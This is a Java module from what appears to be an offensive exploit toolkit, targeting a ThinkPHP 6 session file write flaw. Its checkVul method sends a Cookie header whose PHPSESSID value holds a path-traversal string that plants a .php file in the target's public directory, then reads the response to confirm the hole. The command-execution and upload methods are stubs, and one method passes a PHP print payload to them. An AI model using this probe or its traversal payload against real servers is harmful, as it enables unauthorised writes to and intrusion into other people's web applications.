package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP6_session_file_write implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;

    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;
        String randstr = Tools.getRandomString(7);
        url = url + "/" + randstr + ".php";
        this.headers.put("Cookie", "PHPSESSID=../../../../public/" + randstr + ".php");
        Response response = HttpTools.get(url, this.headers, "UTF-8");
        if (response.getText().contains("a:1:{s:4:\"name\";s:8:\"thinkphp\";}")) {
            this.results = "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞";
            this.isVul = true;
            return this.results;
        } else if (response.getError() != null) {
            this.results = "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
            return this.results;
        } else {
            this.results = "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
            return this.results;
        }
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        return "---) 未实现 (---";
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {
        return "---) 未实现 (---";
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
